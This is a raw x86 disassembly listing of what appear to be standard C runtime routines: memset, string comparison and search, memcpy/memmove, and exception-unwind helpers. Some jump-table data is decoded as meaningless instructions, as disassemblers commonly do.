  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
